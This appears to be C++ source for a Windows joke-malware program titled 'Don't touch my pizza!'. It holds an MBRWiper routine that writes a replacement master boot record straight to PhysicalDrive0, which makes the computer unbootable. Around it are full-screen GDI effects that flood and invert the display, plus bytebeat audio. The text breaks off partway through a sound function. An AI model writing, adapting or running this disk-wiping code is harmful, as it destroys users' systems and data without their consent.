// DTMP.cpp : Don't touch my pizza!
//

#include <stdio.h>
#include <stdlib.h>
#include <cstdlib>
#include <iostream>
#include <math.h>
#include <time.h>
#include <Windows.h>
#include <windowsx.h>
#include <tchar.h>
#include <ctime>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#include "bootrec.h"
#define NOTSRCINVERT (DWORD)0x999999
#define M_PI   3.14159265358979323846264338327950288
//#define PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG); 
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int why = 1;
	//int why2 = 1;
	//int why3 = 1;	
	//float i = 0;	
	//int ogus = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, NOTSRCERASE);
		  //HBRUSH brush = CreateSolidBrush(RGB(why, why2, why3));
		  //SelectObject(hdc, brush);
		  //PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
		  //StretchBlt(hdc,rand()%sw/2,rand()%sh/2,rand()%sw,rand()%sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,SRCAND);
		  //DeleteObject(brush);why++;why2++;why2++;why3++;why3++;why3++;
		//DrawIcon(hdc, sin(i/3) * (sh / 1.5) + (sh / 2), tan(-i) * (sw / 2) + (sw / 2), LoadIcon(NULL, IDI_WARNING));//Icon sine effect by MaxiToys
		//DrawIcon(hdc, sin(i/3) * (sw / 1.5) + (sw / 2), tan(-i) * (sh / 2) + (sh / 2), LoadIcon(NULL, IDI_ERROR));i++;i++;i++;i++;i++;//Icon sine effect by MaxiToys
		//StretchBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,-80,sw,sh,hdc,0,0,SRCCOPY);
		//BitBlt(hdc,0,sh-80,sw,sh,hdc,0,0,SRCCOPY);
		//DrawIconEx(hdc, rand()%sw, rand()%sh, LoadCursor(NULL, IDC_WAIT),100,100,0, NULL, DI_NORMAL);
		//Sleep(1);
		why++;
		HBRUSH brush = CreateSolidBrush(RGB(why, why + 1, why + 2));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
		DeleteObject(brush);
		Sleep(3);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, 0, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	LPCSTR text = "Don't touch my pizza!";
	int why = 1;
	int why2 = 1;
	int signX = 1;
	int signY = 1;
	while (1)
	{
		HDC hdc = GetDC(0);
		HMODULE hModule = LoadLibrary(TEXT("shell32.dll"));
		SetBkMode(hdc, 0);
		HFONT font = CreateFontA(100, 30, 0, 0, FW_BOLD, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Arial");
		SelectObject(hdc, font);
		SetTextColor(hdc, RGB(255, 0, 255));
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		//Sleep(1);
		SetTextColor(hdc, RGB(0, 255, 0));
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(hModule, MAKEINTRESOURCE(rand() % (114 - 50 + 1))), 300, 300, 0, 0, DI_NORMAL);
		StretchBlt(hdc, x / 4, y / 4, x / 2, y / 2, hdc, 0, 0, x, y, SRCCOPY);
		//Sleep(1);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int why = 1;
	//int why2 = 1;
	//int why3 = 1;	
	//float i = 0;	
	//int ogus = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, NOTSRCERASE);
		  //HBRUSH brush = CreateSolidBrush(RGB(why, why2, why3));
		  //SelectObject(hdc, brush);
		  //PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
		  //StretchBlt(hdc,rand()%sw/2,rand()%sh/2,rand()%sw,rand()%sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,SRCAND);
		  //DeleteObject(brush);why++;why2++;why2++;why3++;why3++;why3++;
		//DrawIcon(hdc, sin(i/3) * (sh / 1.5) + (sh / 2), tan(-i) * (sw / 2) + (sw / 2), LoadIcon(NULL, IDI_WARNING));//Icon sine effect by MaxiToys
		//DrawIcon(hdc, sin(i/3) * (sw / 1.5) + (sw / 2), tan(-i) * (sh / 2) + (sh / 2), LoadIcon(NULL, IDI_ERROR));i++;i++;i++;i++;i++;//Icon sine effect by MaxiToys
		//StretchBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,-80,sw,sh,hdc,0,0,SRCCOPY);
		//BitBlt(hdc,0,sh-80,sw,sh,hdc,0,0,SRCCOPY);
		//DrawIconEx(hdc, rand()%sw, rand()%sh, LoadCursor(NULL, IDC_WAIT),100,100,0, NULL, DI_NORMAL);
		StretchBlt(hdc, 0, 0, sw - why, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, 0, 0, sw, sh - why, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, why, 0, sw - why, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(hdc, 0, why, sw, sh - why, hdc, 0, 0, sw, sh, SRCCOPY);
		//StretchBlt(hdc,sin(0-why/8) * (sw / 1.5) + (sw / 2),sin(0-why/10) * (sh / 1.5) + (sh / 4),sw,sh,hdc,0,0,sw,sh,NOTSRCERASE);
		BitBlt(hdc, why, why, sw - why, sh - why, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, why, why, sw - why, sh - why, hdc, 0, 0, NOTSRCERASE);
		why++; why++;
		//BitBlt(hdc,sw-why,0,sw,sh,hdc,0,0,SRCCOPY);why++;
		//HBRUSH brush = CreateSolidBrush(RGB(why-20,why,why+20));
		//SelectObject(hdc, brush);
		//PatBlt(hdc,0,0,sw,sh,PATINVERT);
		//DeleteObject(brush);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, 0, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int why = 1;
	int why2 = 1;
	int signX = 1;
	int signY = 1;
	//int why3 = 1;	
	//float i = 0;	
	//int ogus = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, NOTSRCERASE);
		  //HBRUSH brush = CreateSolidBrush(RGB(why, why2, why3));
		  //SelectObject(hdc, brush);
		  //PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
		  //StretchBlt(hdc,rand()%sw/2,rand()%sh/2,rand()%sw,rand()%sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,SRCAND);
		  //DeleteObject(brush);why++;why2++;why2++;why3++;why3++;why3++;
		//DrawIcon(hdc, sin(i/3) * (sh / 1.5) + (sh / 2), tan(-i) * (sw / 2) + (sw / 2), LoadIcon(NULL, IDI_WARNING));//Icon sine effect by MaxiToys
		//DrawIcon(hdc, sin(i/3) * (sw / 1.5) + (sw / 2), tan(-i) * (sh / 2) + (sh / 2), LoadIcon(NULL, IDI_ERROR));i++;i++;i++;i++;i++;//Icon sine effect by MaxiToys
		//StretchBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,-80,sw,sh,hdc,0,0,SRCCOPY);
		//BitBlt(hdc,0,sh-80,sw,sh,hdc,0,0,SRCCOPY);
		//(32512 + rand() % (32518 - 32512 + 1))
		//DrawIconEx(hdc, why+rand()%50, why2+rand()%50, LoadIcon(NULL, MAKEINTRESOURCE((32512 + rand() % (32518 - 32512 + 1)))),100,100,0, NULL, DI_NORMAL);
		HPEN hPen = CreatePen(PS_SOLID, 10, RGB(0, 255, 0));
		HPEN hOldPen = SelectPen(hdc, hPen);

		HBRUSH hBrush = CreateSolidBrush(RGB(255, 0, 255));
		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);

		POINT vertices[] = { {why, why2}, {why + rand() % 100 + 1, why2 - rand() % 100 + 1}, {why * rand() % 8 + 1, why2 / rand() % 8 + 1} };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		BitBlt(hdc, 0, 0, sw, sh, hdc, -3, 0, SRCAND);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 3, 0, SRCAND);

		DeleteObject(hBrush);
		DeleteObject(hPen);
		if (why2 >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (why >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (why2 <= 0)
		{
			signY = 1;
		}

		if (why <= 0)
		{
			signX = 1;
		}
		if (signX == 1)
		{
			why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++; why++;
		}
		else {
			why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--; why--;
		}
		if (signY == 1)
		{
			why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++; why2++;
		}
		else {
			why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--; why2--;
		}
		//why++;why2++;
		//Sleep(1);
		//StretchBlt(hdc, 5-rand()%10, 5-rand()%10, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc,0-why,0,sw,sh,hdc,0,0,SRCCOPY);
		//BitBlt(hdc,sw-why,0,sw,sh,hdc,0,0,SRCCOPY);why++;
		//HBRUSH brush = CreateSolidBrush(RGB(why-20,why,why+20));
		//SelectObject(hdc, brush);
		//PatBlt(hdc,0,0,sw,sh,PATINVERT);
		//DeleteObject(brush);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, 0, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int why = 1;
	//int why3 = 1;	
	//float i = 0;	
	//int ogus = 1;
	while (true)
	{
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, (rand() % 51)-25, (rand() % 51)-25, sw, sh, hdc, 0, 0, NOTSRCERASE);
		  //HBRUSH brush = CreateSolidBrush(RGB(why, why2, why3));
		  //SelectObject(hdc, brush);
		  //PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
		  //StretchBlt(hdc,rand()%sw/2,rand()%sh/2,rand()%sw,rand()%sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,SRCAND);
		  //DeleteObject(brush);why++;why2++;why2++;why3++;why3++;why3++;
		//DrawIcon(hdc, sin(i/3) * (sh / 1.5) + (sh / 2), tan(-i) * (sw / 2) + (sw / 2), LoadIcon(NULL, IDI_WARNING));//Icon sine effect by MaxiToys
		//DrawIcon(hdc, sin(i/3) * (sw / 1.5) + (sw / 2), tan(-i) * (sh / 2) + (sh / 2), LoadIcon(NULL, IDI_ERROR));i++;i++;i++;i++;i++;//Icon sine effect by MaxiToys
		//StretchBlt(hdc,0,0,0-sw,0-sh,hdc,0,0,sw,sh,SRCCOPY);
		//BitBlt(hdc,0,-80,sw,sh,hdc,0,0,SRCCOPY);
		//BitBlt(hdc,0,sh-80,sw,sh,hdc,0,0,SRCCOPY);
		//(32512 + rand() % (32518 - 32512 + 1))
		//DrawIconEx(hdc, why+rand()%50, why2+rand()%50, LoadIcon(NULL, MAKEINTRESOURCE((32512 + rand() % (32518 - 32512 + 1)))),100,100,0, NULL, DI_NORMAL);
		BitBlt(hdc, 0, 0, sw, sh, hdc, (sw / 2) + why, 0, NOTSRCCOPY);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, (sh / 2) + why, NOTSRCERASE);
		BitBlt(hdc, 0, 0, sw, sh, hdc, (0 - sw / 2) + why, 0, NOTSRCCOPY);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, (0 - sh / 2) + why, NOTSRCERASE);
		BitBlt(hdc, 0, 0, sw, sh, hdc, sw / 2, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 0 - sw / 2, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, sh / 2, SRCINVERT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0 - sh / 2, SRCINVERT);
		DrawIconEx(hdc, rand() % sw, rand() % sh, LoadIcon(NULL, MAKEINTRESOURCE((32512 + rand() % (32518 - 32512 + 1)))), 500, 500, 0, NULL, DI_NORMAL);
		why++;
		//why++;why2++;
		//Sleep(1);
		//StretchBlt(hdc, 5-rand()%10, 5-rand()%10, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc,0-why,0,sw,sh,hdc,0,0,SRCCOPY);
		//BitBlt(hdc,sw-why,0,sw,sh,hdc,0,0,SRCCOPY);why++;
		//HBRUSH brush = CreateSolidBrush(RGB(why-20,why,why+20));
		//SelectObject(hdc, brush);
		//PatBlt(hdc,0,0,sw,sh,PATINVERT);
		//DeleteObject(brush);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, 0, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, 0, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int why = 0;
	int why2 = 0;
	int inc31 = w - h % w - h;
	while (1) {
		HDC hdc = GetDC(0);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		POINT pt1[10];
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, (0 - w / 1.5) + why, 0, 0x1900ac010e);
		BitBlt(hdc, 0, 0, w, h, hdc, (w / 1.5) - why, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, (0 - h / 1.5) + why2, 0x1900ac010e);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, (h / 1.5) - why2, SRCINVERT);
		pt1[0].x = rect.left - inc31;
		pt1[0].y = rect.top - inc31;
		pt1[1].x = rect.right - inc31;
		pt1[1].y = rect.top + inc31;
		pt1[2].x = rect.left + inc31;
		pt1[2].y = rect.bottom - inc31;
		PlgBlt(hdc, pt1, hdc, rect.left, rect.top, rect.right, rect.bottom, 0, 0, 0);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc); why++; why2++; why2++;
		//Sleep(rand() % 100);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 3 | t >> 8) ^ 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8 & t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 12) * t * (t >> 8 | t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
